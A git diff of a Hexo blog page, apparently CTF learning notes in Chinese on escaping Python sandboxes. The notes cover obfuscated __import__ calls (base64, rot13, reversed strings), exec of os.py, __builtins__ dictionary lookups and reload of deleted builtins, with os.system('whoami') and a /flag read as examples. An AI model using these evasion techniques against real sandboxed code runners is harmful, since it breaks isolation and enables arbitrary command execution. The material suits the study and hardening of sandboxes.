@@ -1,572 +1,436 @@
-
 <!DOCTYPE html>
 <html lang="zh-cn">
-    
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="generator" content="Hexo">
-    <title>python沙盒逃逸one - Hexo</title>
-    <meta name="author" content="John Doe">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="p1k">
     
-    
-    
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"articleBody":"第一篇主要学习导入模块的方式\n\n\n空格绕过分隔符用多个空格\n1234&gt;&gt;&gt; import os&gt;&gt;&gt; import  os&gt;&gt;&gt; import   os&gt;&gt;&gt; import   sys\n\n同义词绕过_import_1234&gt;&gt;&gt; __import__('os')&lt;module 'os' from '/usr/lib/python2.7/os.pyc'&gt;&gt;&gt;&gt; __import__('os').system('ls')公共  图片  音乐\tcore   hash_extender  pick.py\t static\n\n_importlib_123456&gt;&gt;&gt; import importlib&gt;&gt;&gt; p1k=importlib.import_module('bf'.decode('rot-13'))&gt;&gt;&gt; p1k&lt;module 'os' from '/usr/lib/python2.7/os.pyc'&gt;&gt;&gt;&gt; p1k.system('whoami')root\n\nexecfilepython导入库，实际上就是执行一次库文件(2.x版本可用，3.x版本删除execfile)\n123&gt;&gt;&gt; execfile(&apos;/usr/lib/python2.7/os.py&apos;)&gt;&gt;&gt; system(&apos;ls&apos;)公共  图片  音乐\tcore   hash_extender  pick.py\t static\n\n2.x 3.x 通用的方法\n123with open('/usr/lib/python3.6/os.py','r') as f:    exec(f.read())system('ls')\n\n执行一下\n12root@kali:~# python3 11.py 11.py  视频\n\n内建模块python中直接使用的内置函数 例如open() int() chr() 是随着内建模块一同被导入的，python2.x中称为__builtin__\n3.x中称为builtins\n12&gt;&gt;&gt; __builtins__.open('/flag').read()'sss'\n\nbuiltin builtins  \\builtin__  \\builtins__  的区别\n__builtins__是不能导入的，__builtin__是可以导入的，由此可见，实际上并没有\\builtins__模块，\\builtins__模块实际上是python解释器创建的一个对\\builtin__(2.x)  builtins(3.x)模块的引用\n12345&gt;&gt;&gt; import __builtins__Traceback (most recent call last):  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;ImportError: No module named __builtins__&gt;&gt;&gt; import __builtin__\n\n__dict__获取对象属性，一个模块对象有一个由字典对象实现的命名空间，模块中的属性引用被转为在这个字典中的查找，例如m.x ==&gt;m.dict[‘x’]  \n1234567&gt;&gt;&gt; __builtins__.__dict__['__import__']('os').system('whoami')rootbase64编码__builtins__.__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64')).system('whoami')反转&gt;&gt;&gt; __builtins__.__dict__['__tropmi__'[::-1]]('os').system('whoami')root\n\n模块被删除12&gt;&gt;&gt; import sys&gt;&gt;&gt; sys.modules['os']=None\n\n路径导入导入os试试\n1234&gt;&gt;&gt; import osTraceback (most recent call last):  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;ImportError: No module named os\n\n不能被导入，针对上面需要路径的，大都是默认路径，如果sys没被干掉可以使用sys.path看一下\n123&gt;&gt;&gt; import sys&gt;&gt;&gt; print syspath['', '/usr/lib/python2.7',\n\n利用路径导入os\n12&gt;&gt;&gt; sys.modules['os']='/usr/lib/python2.7/os'&gt;&gt;&gt; import os\n\nreload重载当一些函数被破坏或者删除的时候，\n12__builtins__.__dict__['eval'] = 'not allowed' //破坏evaldel __builtins__.__dict__['eval']           //删除eval\n\n可以使用reload重载来恢复。注意python2.x中reload在__builtins__模块中，python3.x中reload在imp模块中\n123456789&gt;&gt;&gt; del __builtins__.__dict__['eval']&gt;&gt;&gt; evalTraceback (most recent call last):  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;NameError: name 'eval' is not defined&gt;&gt;&gt; reload(__builtins__)&lt;module '__builtin__' (built-in)&gt;&gt;&gt;&gt; eval&lt;built-in function eval&gt;\n\npython3.x引入reload\n123&gt;&gt;&gt; import imp&gt;&gt;&gt; imp.reload(__builtins__)&lt;module 'builtins' (built-in)&gt;\n\n小结：大多数的关键词都是可以通过编码 反转这些绕过的\n参考链接\nhttp://yulige.top/?p=502\nhttps://www.freebuf.com/articles/system/203208.html\n","dateCreated":"2019-09-11T21:36:13+08:00","dateModified":"2019-09-14T16:16:08+08:00","datePublished":"2019-09-11T21:36:13+08:00","description":"第一篇主要学习导入模块的方式","headline":"python沙盒逃逸one","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://p1keman.github.io/2019/09/11/python沙盒逃逸one/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://p1keman.github.io/2019/09/11/python沙盒逃逸one/"}</script>
-    <meta name="description" content="第一篇主要学习导入模块的方式">
-<meta property="og:type" content="blog">
-<meta property="og:title" content="python沙盒逃逸one">
-<meta property="og:url" content="http://p1keman.github.io/2019/09/11/python沙盒逃逸one/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="第一篇主要学习导入模块的方式">
-<meta property="og:locale" content="zh-cn">
-<meta property="og:updated_time" content="2019-09-14T08:16:08.381Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="python沙盒逃逸one">
-<meta name="twitter:description" content="第一篇主要学习导入模块的方式">
-    
-    
+    <title>
         
-    
-    
-    
-    
-    
-    <!--STYLES-->
-    <link rel="stylesheet" href="/assets/css/style-6tgl0yz7lnfzkusrxanjzjinweinxlhwhjly7phr1vxoylo39j7uvbjbwsfg.min.css">
-    <!--STYLES END-->
-    
-
-    
-
-    
+            python沙盒逃逸one |
         
+        p1k&#39;s blog
+    </title>
+    <link rel="shortcut icon" href="/images/logo.svg">
     
-</head>
-
-    <body>
-        <div id="blog">
-            <!-- Define author's picture -->
-
+<link rel="stylesheet" href="/css/style.css">
 
     
+<link rel="stylesheet" href="/css/font-awesome.min.css">
 
-<header id="header" data-behavior="4">
-    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
-    <div class="header-title">
-        <a
-            class="header-title-link"
-            href="/ "
-            aria-label=""
-        >
-            Hexo
-        </a>
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"p1keman.github.io","root":"/","language":"zh-cn"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.svg","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"SBJ is SB."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":false,"preload":false},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.3.1"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days age","week":"%s weeks age","month":"%s months age","year":"%s years age"};
+  </script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            <a class="logo-title" href="/">
+                p1k&#39;s blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
     </div>
-    
-        
-            <a
-                class="header-right-picture "
-                href="#about"
-                aria-label="打开链接: /#about"
-            >
-        
-        
-        </a>
-    
-</header>
 
-            <!-- Define author's picture -->
-
-
-<nav id="sidebar" data-behavior="4">
-    <div class="sidebar-container">
-        
-        
-            <ul class="sidebar-buttons">
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
             
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/"
-                            
-                            rel="noopener"
-                            title="首页"
-                        >
-                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">首页</span>
-                    </a>
-            </li>
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
             
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/all-categories"
-                            
-                            rel="noopener"
-                            title="分类"
-                        >
-                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">分类</span>
-                    </a>
-            </li>
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
             
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/all-tags"
-                            
-                            rel="noopener"
-                            title="标签"
-                        >
-                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">标签</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/all-archives"
-                            
-                            rel="noopener"
-                            title="归档"
-                        >
-                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">归档</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link open-algolia-search"
-                            href="#search"
-                            
-                            rel="noopener"
-                            title="搜索"
-                        >
-                        <i class="sidebar-button-icon fa fa-search" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">搜索</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="#about"
-                            
-                            rel="noopener"
-                            title="关于"
-                        >
-                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">关于</span>
-                    </a>
-            </li>
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
             
         </ul>
-        
     </div>
-</nav>
 
-            
-            <div id="main" data-behavior="4"
-                 class="
-                        hasCoverMetaIn
-                        ">
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content normal-code-theme">
+
                 
-<article class="post">
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">python沙盒逃逸one</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.svg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">p1k</span>
+                        <span class="level">Lv6</span>
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i> 2019-09-11 21:36:13
+    </span>
     
     
-        <div class="post-header main-content-wrap text-left">
-    
-        <h1 class="post-title">
-            python沙盒逃逸one
-        </h1>
+
     
     
-        <div class="post-meta">
-    <time datetime="2019-09-11T21:36:13+08:00">
-	
-		    9月 11, 2019
-    	
-    </time>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i> <span id="busuanzi_value_page_pv"></span>
+        </span>
     
 </div>
 
-    
-</div>
+                    </div>
+                </div>
+            </div>
+        
 
-    
-    <div class="post-content markdown">
-        <div class="main-content-wrap">
+        <div class="article-content markdown-body">
             <p>第一篇主要学习导入模块的方式</p>
 <a id="more"></a>
 
 <h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><p>分隔符用多个空格</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span>  os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span>   os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span>   sys</span><br></pre></td></tr></table></figure>
-
-<h2 id="同义词绕过"><a href="#同义词绕过" class="headerlink" title="同义词绕过"></a>同义词绕过</h2><h3 id="import"><a href="#import" class="headerlink" title="_import_"></a>_<em>import_</em></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__import__(<span class="string">'os'</span>)</span><br><span class="line">&lt;module <span class="string">'os'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/os.pyc'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__import__(<span class="string">'os'</span>).system(<span class="string">'ls'</span>)</span><br><span class="line">公共  图片  音乐	core   hash_extender  pick.py	 static</span><br></pre></td></tr></table></figure>
-
-<h3 id="importlib"><a href="#importlib" class="headerlink" title="_importlib_"></a>_<em>importlib_</em></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> importlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p1k=importlib.import_module(<span class="string">'bf'</span>.decode(<span class="string">'rot-13'</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p1k</span><br><span class="line">&lt;module <span class="string">'os'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/os.pyc'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p1k.system(<span class="string">'whoami'</span>)</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
-
+<h2 id="同义词绕过"><a href="#同义词绕过" class="headerlink" title="同义词绕过"></a>同义词绕过</h2><h3 id="import"><a href="#import" class="headerlink" title="_import_"></a>_<em>import_</em></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line">&lt;module <span class="string">&#x27;os&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/os.pyc&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">公共  图片  音乐	core   hash_extender  pick.py	 static</span><br></pre></td></tr></table></figure>
+<h3 id="importlib"><a href="#importlib" class="headerlink" title="_importlib_"></a>_<em>importlib_</em></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> importlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p1k=importlib.import_module(<span class="string">&#x27;bf&#x27;</span>.decode(<span class="string">&#x27;rot-13&#x27;</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p1k</span><br><span class="line">&lt;module <span class="string">&#x27;os&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/os.pyc&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p1k.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">root</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <h3 id="execfile"><a href="#execfile" class="headerlink" title="execfile"></a>execfile</h3><p>python导入库，实际上就是执行一次库文件(2.x版本可用，3.x版本删除execfile)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; execfile(&apos;/usr/lib/python2.7/os.py&apos;)</span><br><span class="line">&gt;&gt;&gt; system(&apos;ls&apos;)</span><br><span class="line">公共  图片  音乐	core   hash_extender  pick.py	 static</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; execfile(&#39;&#x2F;usr&#x2F;lib&#x2F;python2.7&#x2F;os.py&#39;)</span><br><span class="line">&gt;&gt;&gt; system(&#39;ls&#39;)</span><br><span class="line">公共  图片  音乐	core   hash_extender  pick.py	 static</span><br></pre></td></tr></table></figure>
 <p>2.x 3.x 通用的方法</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'/usr/lib/python3.6/os.py'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    exec(f.read())</span><br><span class="line">system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/usr/lib/python3.6/os.py&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    exec(f.read())</span><br><span class="line">system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure>
 <p>执行一下</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python3 11.py </span></span><br><span class="line">11.py  视频</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python3 11.py </span></span><br><span class="line">11.py  视频  </span><br></pre></td></tr></table></figure>
 
 <h2 id="内建模块"><a href="#内建模块" class="headerlink" title="内建模块"></a>内建模块</h2><p>python中直接使用的内置函数 例如open() int() chr() 是随着内建模块一同被导入的，python2.x中称为__builtin__</p>
 <p>3.x中称为builtins</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.open(<span class="string">'/flag'</span>).read()</span><br><span class="line"><span class="string">'sss'</span></span><br></pre></td></tr></table></figure>
-
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;sss&#x27;</span></span><br></pre></td></tr></table></figure>
 <p>builtin builtins  <em>\</em>builtin__  <em>\</em>builtins__  的区别</p>
 <p>__builtins__是不能导入的，__builtin__是可以导入的，由此可见，实际上并没有<em>\</em>builtins__模块，<em>\</em>builtins__模块实际上是python解释器创建的一个对<em>\</em>builtin__(2.x)  builtins(3.x)模块的引用</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> __builtins__</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ImportError: No module named __builtins__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> __builtin__</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> __builtins__</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ImportError: No module named __builtins__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> __builtin__</span><br></pre></td></tr></table></figure>
 <p>__dict__获取对象属性，一个模块对象有一个由字典对象实现的命名空间，模块中的属性引用被转为在这个字典中的查找，例如m.x ==&gt;m.dict[‘x’]  </p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'whoami'</span>)</span><br><span class="line">root</span><br><span class="line">base64编码</span><br><span class="line">__builtins__.__dict__[<span class="string">'X19pbXBvcnRfXw=='</span>.decode(<span class="string">'base64'</span>)](<span class="string">'b3M='</span>.decode(<span class="string">'base64'</span>)).system(<span class="string">'whoami'</span>)</span><br><span class="line">反转</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">'__tropmi__'</span>[::<span class="number">-1</span>]](<span class="string">'os'</span>).system(<span class="string">'whoami'</span>)</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
-
-<h2 id="模块被删除"><a href="#模块被删除" class="headerlink" title="模块被删除"></a>模块被删除</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">'os'</span>]=<span class="literal">None</span></span><br></pre></td></tr></table></figure>
-
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">root</span><br><span class="line">base64编码</span><br><span class="line">__builtins__.__dict__[<span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)](<span class="string">&#x27;b3M=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">反转</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;__tropmi__&#x27;</span>[::-<span class="number">1</span>]](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">root</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="模块被删除"><a href="#模块被删除" class="headerlink" title="模块被删除"></a>模块被删除</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">&#x27;os&#x27;</span>]=<span class="literal">None</span></span><br></pre></td></tr></table></figure>
 <h3 id="路径导入"><a href="#路径导入" class="headerlink" title="路径导入"></a>路径导入</h3><p>导入os试试</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ImportError: No module named os</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ImportError: No module named os</span><br></pre></td></tr></table></figure>
 <p>不能被导入，针对上面需要路径的，大都是默认路径，如果sys没被干掉可以使用sys.path看一下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> syspath</span><br><span class="line">[<span class="string">''</span>, <span class="string">'/usr/lib/python2.7'</span>,</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> syspath</span><br><span class="line">[<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/usr/lib/python2.7&#x27;</span>, </span><br></pre></td></tr></table></figure>
 <p>利用路径导入os</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">'os'</span>]=<span class="string">'/usr/lib/python2.7/os'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">&#x27;os&#x27;</span>]=<span class="string">&#x27;/usr/lib/python2.7/os&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br></pre></td></tr></table></figure>
+
 
 <h3 id="reload重载"><a href="#reload重载" class="headerlink" title="reload重载"></a>reload重载</h3><p>当一些函数被破坏或者删除的时候，</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">'eval'</span>] = <span class="string">'not allowed'</span> //破坏eval</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'eval'</span>]           //删除eval</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>] = <span class="string">&#x27;not allowed&#x27;</span> //破坏<span class="built_in">eval</span></span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]           //删除<span class="built_in">eval</span></span><br></pre></td></tr></table></figure>
 <p>可以使用reload重载来恢复。注意python2.x中reload在__builtins__模块中，python3.x中reload在imp模块中</p>
